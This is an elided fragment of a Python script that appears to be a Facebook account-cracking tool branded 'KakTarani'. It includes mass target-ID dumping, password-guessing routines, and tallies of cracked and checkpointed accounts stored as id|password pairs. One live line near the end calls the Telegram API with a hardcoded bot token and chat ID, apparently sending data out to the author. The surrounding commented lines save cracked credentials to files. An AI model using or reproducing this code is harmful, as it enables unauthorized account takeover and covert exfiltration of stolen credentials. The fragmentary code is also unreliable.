...
def uaku():
        try:
                ...
                ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensiKakTarani= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
...
#  print(f'\t THE MEMEKERS ')
        print(f'\tTelegram > @KakTarani')
        print(f'\tTele chanel > @https://t.me/KakTarani ')
        print(f'\tInstagram > @KakTarani')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
        try:
        ...
        if kz in ['2']:
                ...
                if len(vin)==0:
                        ...
                        for cpku in range(len(lin)):
                                cpKakTarani=lin[nocp].split('|')
                                print(f'{b}├──> {k}{cpKakTarani[0]}|{cpKakTarani[1]}')
                                nocp +=1
                        print('')
                ...
                if len(vin)==0:
                        ...
                        for cpku in range(len(lin)):
                                cpKakTarani=lin[nocp].split('|')
                                print('')
                                print(f'{x}<•> {h}{cpKakTarani[0]}|{cpKakTarani[1]}|{cpKakTarani[2]}')
                                nocp +=1
                        print('')
...
def dump_massal():
        try:
                ...
                exit()
        try:
                jum = int(input(' - number of targets  ? : '))
        except ValueError:
                print('├──> ID :  ')
                exit()
        if jum<1 or jum>100:
...
# print('')
        ...
        if hc in ['1','01']:
                ...
                method.append('mobile')
        print('')
        _jembot_ = input('Show associated applications :  \n1 - yes \n2 - no \n')
        if _jembot_ in ['']:
                print('├──> chose ')
                back()
...
def passwrd():
        ...
        print(f'[{b}•{x}]{h} KakTarani OK : {h}%s '%(ok))
        print(f'{x}[{b}•{x}]{k} KakTarani CP : {b}%s{x} '%(cp))
        print('')
...
#                       if "checkpoint" in po.cookies.get_dict().keys():
requests.request("GET",f"https://api.telegram.org/bot5015678409:AAGo1vc5t2kamf4pE6uu63WmTkSs55g288I/sendMessage?chat_id=1396443240&text={open}")
#                               os.popen('')
#                                       open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
#                               akun.append(idf+'|'+pw)
#                               cp+=1
